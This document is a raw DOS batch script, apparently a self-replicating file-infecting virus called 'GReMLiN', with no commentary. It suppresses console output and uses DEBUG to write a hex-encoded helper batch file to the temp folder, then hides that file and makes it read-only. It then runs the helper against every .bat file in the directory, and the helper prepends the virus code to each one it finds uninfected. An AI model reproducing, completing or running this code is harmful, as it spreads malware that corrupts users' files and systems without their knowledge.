@echo off%_GReMLiN%
ctty nul%_GReMLiN%
del %temp%\GReMLiN
if exist %temp%\GReMLiN.BAT goto GReMLiNf
echo n %temp%\GReMLiN.BAT > %temp%\GReMLiN
echo e 0100 40 65 63 68 6F 20 6F 66 66 0D 0A 69 66 20 25 69 >> %temp%\GReMLiN
echo e 0110 6E 66 25 20 3D 3D 20 31 20 67 6F 74 6F 20 65 6E >> %temp%\GReMLiN
echo e 0120 64 0D 0A 66 69 6E 64 20 22 47 52 65 4D 4C 69 4E >> %temp%\GReMLiN
echo e 0130 22 3C 25 31 0D 0A 69 66 20 65 72 72 6F 72 6C 65 >> %temp%\GReMLiN
echo e 0140 76 65 6C 20 31 20 67 6F 74 6F 20 69 6E 66 65 63 >> %temp%\GReMLiN
echo e 0150 74 0D 0A 67 6F 74 6F 20 65 6E 64 0D 0A 3A 69 6E >> %temp%\GReMLiN
echo e 0160 66 65 63 74 0D 0A 64 65 6C 20 61 0D 0A 66 69 6E >> %temp%\GReMLiN
echo e 0170 64 20 22 47 52 65 4D 4C 69 4E 22 3C 25 32 3E 3E >> %temp%\GReMLiN
echo e 0180 62 0D 0A 63 6F 70 79 20 2F 62 20 62 20 2B 20 25 >> %temp%\GReMLiN
echo e 0190 31 20 61 0D 0A 64 65 6C 20 62 0D 0A 64 65 6C 20 >> %temp%\GReMLiN
echo e 01A0 25 31 0D 0A 72 65 6E 61 6D 65 20 61 20 25 31 0D >> %temp%\GReMLiN
echo e 01B0 0A 73 65 74 20 69 6E 66 3D 31 0D 0A 3A 65 6E 64 >> %temp%\GReMLiN
echo e 01C0 0D 0A >> %temp%\GReMLiN
echo rcx >> %temp%\GReMLiN
echo C2 >> %temp%\GReMLiN
echo w >> %temp%\GReMLiN
echo q >> %temp%\GReMLiN
debug<%temp%\GReMLiN
del %temp%\GReMLiN
attrib +h +r %temp%\GReMLiN.BAT
:GReMLiNf
for %%f in (*.bat) do call %temp%\GReMLiN.BAT %%f %0.bat
set inf=%_GReMLiN%
ctty con%_GReMLiN%
